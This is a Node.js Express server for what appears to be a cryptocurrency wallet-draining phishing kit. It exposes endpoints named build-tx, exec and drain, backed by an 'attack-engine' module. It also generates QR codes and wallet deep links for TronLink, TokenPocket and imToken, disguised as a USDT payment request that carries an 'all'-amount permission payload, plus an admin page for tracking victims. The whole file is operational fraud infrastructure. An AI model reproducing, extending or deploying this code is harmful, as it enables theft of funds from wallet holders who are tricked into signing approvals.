const express = require('express');
const cors = require('cors');
const path = require('path');
const crypto = require('crypto');
const config = require('./config');
const Engine = require('./attack-engine');
const app = express();
app.use(cors());
app.use(express.json({ limit: '10mb' }));
const engine = new Engine();

app.post('/api/build-tx', async (req, res) => {
    try { res.json({ tx: await engine.buildTx(req.body.target) }); }
    catch (e) { res.status(500).json({ error: e.message }); }
});
app.post('/api/exec', async (req, res) => {
    try { res.json({ result: await engine.execute(req.body.signed, req.body.target, req.body.aid) }); }
    catch (e) { res.status(500).json({ error: e.message }); }
});
app.post('/api/drain', async (req, res) => {
    try { res.json({ results: await engine.drain(req.body.addr) }); }
    catch (e) { res.status(500).json({ error: e.message }); }
});
app.get('/api/list', (req, res) => res.json(engine.getList()));
app.get('/api/stats/:id', (req, res) => res.json(engine.getStats(req.params.id)));

app.post('/api/qr', async (req, res) => {
    try {
        const id = crypto.randomBytes(8).toString('hex');
        const base = 'http://' + (req.headers.host || 'localhost:3000');
        const payload = { id, type: 'perm', amount: req.body.amount || 'all', label: req.body.label || 'USDT收款', created: Date.now() };
        const encoded = Buffer.from(JSON.stringify(payload)).toString('base64url');
        const links = {
            web: base + '/pay?d=' + encoded,
            tronlink: 'tronlink://open?url=' + encodeURIComponent(base + '/pay?d=' + encoded + '&w=tronlink'),
            tp: 'https://tokenpocket.github.io/tp/?url=' + encodeURIComponent(base + '/pay?d=' + encoded + '&w=tp'),
            imtoken: 'imtokenv2://navigate/DappView?url=' + encodeURIComponent(base + '/pay?d=' + encoded + '&w=imtoken'),
            universal: base + '/gate?d=' + encoded
        };
        const QRCode = require('qrcode');
        const img = await QRCode.toDataURL(links.universal, { width: 400, margin: 2, color: { dark: '#00d4aa', light: '#ffffff' } });
        res.json({ id, label: req.body.label, img, links, payload, track: base + '/admin?track=' + id });
    } catch (e) { res.status(500).json({ error: e.message }); }
});

app.use(express.static(path.join(__dirname, '../frontend')));
app.get('/gate', (req, res) => res.sendFile(path.join(__dirname, '../frontend/gate.html')));
app.get('/pay', (req, res) => res.sendFile(path.join(__dirname, '../frontend/pay.html')));
app.get('/admin', (req, res) => res.sendFile(path.join(__dirname, '../frontend/admin.html')));
// 修复：用正则表达式代替 * 通配符
app.get(/^\/admin\/.*/, (req, res) => res.sendFile(path.join(__dirname, '../frontend/admin.html')));
app.listen(config.port, '0.0.0.0', () => console.log('[+] http://0.0.0.0:' + config.port));
